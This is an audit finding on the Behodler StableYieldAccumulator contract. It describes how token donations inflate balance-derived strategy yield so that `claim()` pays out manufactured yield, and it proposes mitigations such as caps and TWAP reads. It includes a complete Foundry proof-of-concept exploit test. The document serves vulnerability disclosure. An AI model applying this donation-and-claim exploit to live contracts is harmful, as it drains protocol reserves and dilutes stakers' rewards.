<!-- METADATA
Title: Strategy yield computation trusts external balance reads, enabling flash-loan donation extraction
Severity: Medium
Root Cause Link: lib/stable-yield-accumulator/src/StableYieldAccumulator.sol#L543-L552
PoC File: workspace/stable-yield-accumulator/test/poc-M-06.t.sol
-->

# Strategy yield computation trusts external balance reads, enabling flash-loan donation extraction

## Lines of code
https://github.com/Behodler/stable-yield-accumulator/blob/master/src/StableYieldAccumulator.sol#L543-L552

## Vulnerability details

### Description

`_getYieldForStrategy` (lines 543-552) computes pending yield as

```solidity
uint256 totalBalance = yieldStrategy.totalBalanceOf(token, minterAddress);
uint256 principal = yieldStrategy.principalOf(token, minterAddress);
if (totalBalance > principal) return totalBalance - principal;
```

This number is consumed directly by `claim()` (line 477) without any defensive bound: no per-claim cap, no per-block delta limit, no TWAP, no plausibility check against historical yield velocity. SYA trusts whatever the strategy reports.

A wide class of strategy adapters compute `totalBalanceOf` from the strategy's live ERC20 balance (or from a vault share price that itself reads on-chain balance). For any such strategy, an attacker can inflate the SYA-perceived yield instantaneously by transferring tokens directly to the strategy ("donating"). `totalBalanceOf - principalOf` jumps by exactly the donation, and SYA happily settles a claim against the inflated number. The strategy ships its real reserves out via `withdrawFrom` (line 480) at the discount rate.

The strategy-side root cause (donation-inflatable accounting) sits in adapter code outside SYA, but the in-scope SYA-layer gap is the absence of any defensive cap on the value that `claim()` will pay out per call. Because SYA is the contract that ultimately authorises the asset transfer, a one-line bound (per-claim cap, per-strategy max-yield-per-block, or a TWAP'ed yield read) at the SYA layer is sufficient to neutralise the entire class of strategy adapters that follow this pattern.

The attack is repeatable: each donation cycle inflates yield, the cycle drains the strategy back to declared principal, and the attacker walks with the donation minus the discount. With flash-loan capital, the per-call profit is `donation * discountBps / 10000` minus gas. With a 2% discount, that is 2% of any donation size the attacker can flash-loan. In strategies that hold reserves above declared principal (other clients' accounting headroom, idle liquidity, etc.), those real reserves are also siphoned along with the donation.

### Impact

A flash-loan-equipped attacker holding an NFT can repeatedly extract `donation * discountBps / 10000` from any registered strategy whose `totalBalanceOf` is balance-derived. Phlimbo books reward-token income for yield events that never occurred, so Limbo-staker distributions are quietly diluted by manufactured yield while the strategy's real reserves are bled out. The blast radius scales with the size of the largest flash loan available in the donation token; for major stablecoins this is effectively unlimited per-block.

### Proof of Concept

Drop into `lib/stable-yield-accumulator/test/poc-M-06.t.sol` and run with `forge test --match-contract PoC_M_06 -vvv`. The PoC uses a deliberately minimal but realistic balance-based strategy adapter.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/StableYieldAccumulator.sol";
import "vault/interfaces/IYieldStrategy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}

contract MockPhlimbo {
    address public immutable rewardToken;
    address public sya;
    constructor(address rt) { rewardToken = rt; }
    function setSYA(address _sya) external { sya = _sya; }
    function collectReward(uint256 amount) external {
        require(msg.sender == sya, "only SYA");
        IERC20(rewardToken).transferFrom(msg.sender, address(this), amount);
    }
}

contract MockNFTMinter {
    uint256 public nextIndex = 1;
    mapping(address => mapping(uint256 => uint256)) public balances;
    mapping(address => bool) public authorizedBurners;
    function registerDispatcher(address, uint256, uint256) external { nextIndex++; }
    function setAuthorizedBurner(address b, bool a) external { authorizedBurners[b] = a; }
    function mintNFT(address h, uint256 id, uint256 a) external { balances[h][id] += a; }
    function balanceOf(address h, uint256 id) external view returns (uint256) { return balances[h][id]; }
    function burn(address h, uint256 id, uint256 q) external {
        require(authorizedBurners[msg.sender], "na"); balances[h][id] -= q;
    }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

contract DonationVulnerableStrategy is IYieldStrategy {
    mapping(address => mapping(address => uint256)) public principals;
    function setPrincipal(address t, address a, uint256 amt) external { principals[t][a] = amt; }
    function principalOf(address t, address a) external view override returns (uint256) { return principals[t][a]; }
    function totalBalanceOf(address t, address) external view override returns (uint256) {
        return IERC20(t).balanceOf(address(this));
    }
    function balanceOf(address t, address) external view override returns (uint256) {
        return IERC20(t).balanceOf(address(this));
    }
    function withdrawFrom(address t, address, uint256 amount, address recipient) external override {
        IERC20(t).transfer(recipient, amount);
    }
    function deposit(address, uint256, address) external pure override {}
    function withdraw(address, uint256, address) external pure override {}
    function setClient(address, bool) external pure override {}
    function emergencyWithdraw(uint256) external pure override {}
    function totalWithdrawal(address, address) external pure override {}
}

contract PoC_M_06 is Test {
    StableYieldAccumulator internal sya;
    MockERC20 internal rewardToken;
    MockERC20 internal strategyToken;
    DonationVulnerableStrategy internal strategy;
    MockPhlimbo internal phlimbo;
    MockNFTMinter internal nftMinter;

    address internal minterAddr = makeAddr("minter");
    address internal attacker = makeAddr("attacker");

    uint256 internal constant PRINCIPAL = 1_000e18;
    uint256 internal constant DONATION = 10_000e18;
    uint256 internal constant DISCOUNT_BPS = 200;

    function setUp() public {
        rewardToken = new MockERC20("USDC", "USDC");
        strategyToken = new MockERC20("USDT", "USDT");

        sya = new StableYieldAccumulator();
        phlimbo = new MockPhlimbo(address(rewardToken));
        phlimbo.setSYA(address(sya));
        nftMinter = new MockNFTMinter();
        nftMinter.setAuthorizedBurner(address(sya), true);
        nftMinter.registerDispatcher(makeAddr("dispatcher"), 1e18, 100);
        strategy = new DonationVulnerableStrategy();

        sya.setPhlimbo(address(phlimbo));
        sya.setRewardToken(address(rewardToken));
        sya.setMinter(minterAddr);
        sya.setDiscountRate(DISCOUNT_BPS);
        sya.setNFTMinter(address(nftMinter));
        sya.addYieldStrategy(address(strategy), address(strategyToken));
        sya.setTokenConfig(address(strategyToken), 18, 1e18);
        sya.setTokenConfig(address(rewardToken), 18, 1e18);
        sya.approvePhlimbo(type(uint256).max);

        strategy.setPrincipal(address(strategyToken), minterAddr, PRINCIPAL);
        strategyToken.mint(address(strategy), PRINCIPAL);
    }

    function test_M06_DonationInflatesYield_StrategyReservesPaidOut() public {
        // Baseline: zero perceived yield, strategy holds only its declared principal.
        assertEq(sya.getYield(address(strategy)), 0);
        assertEq(strategyToken.balanceOf(address(strategy)), PRINCIPAL);

        // Attacker prep.
        strategyToken.mint(attacker, DONATION);
        uint256 expectedPayment = DONATION * (10_000 - DISCOUNT_BPS) / 10_000;
        rewardToken.mint(attacker, expectedPayment);
        nftMinter.mintNFT(attacker, 1, 1);

        vm.startPrank(attacker);
        rewardToken.approve(address(sya), type(uint256).max);

        // Donation inflates the strategy's live balance.
        strategyToken.transfer(address(strategy), DONATION);
        assertEq(strategyToken.balanceOf(address(strategy)), PRINCIPAL + DONATION);

        // SYA perceives yield equal to donation amount.
        assertEq(sya.getYield(address(strategy)), DONATION);

        // Claim - SYA ships the inflated yield out at the discount rate.
        sya.claim(1, 0);
        vm.stopPrank();

        // Strategy released DONATION worth of reserves.
        assertEq(strategyToken.balanceOf(address(strategy)), PRINCIPAL);
        // Phlimbo received the DISCOUNTED payment - so the protocol is short by the discount.
        assertEq(rewardToken.balanceOf(address(phlimbo)), expectedPayment);
        uint256 valueLeak = DONATION - expectedPayment;
        assertEq(valueLeak, DONATION * DISCOUNT_BPS / 10_000, "value leak == discount on donation");

        // Re-arms automatically.
        assertEq(sya.getYield(address(strategy)), 0);
    }
}
```

### Tools Used
Manual review, Foundry.

### Recommended Mitigation Steps

Add a defensive bound at the SYA layer so adapter-side accounting cannot translate into unbounded payouts:

1. Maintain a per-strategy high-water mark for principal and a per-block (or per-window) yield delta cap. Reject any per-strategy yield read whose growth since the last claim exceeds a configurable percent of principal. This blocks the donation step from translating into a same-block claim.
2. Sample `totalBalanceOf` and `principalOf` over a TWAP window (e.g. 2-3 blocks) inside `_getYieldForStrategy`, by storing the previous read and requiring the smaller of (current, previous) to be used.
3. Enforce a per-claim cap on the total yield SYA will withdraw across all strategies, owner-configurable per-token, so a single inflation event cannot drain a strategy's full live balance in one transaction.

Independently, document that registered strategies must use principal-tracked accounting (not balance-derived) and ship a registration-time helper that probes the strategy via a tiny `donate-and-sanity-check` to flag balance-derived implementations.
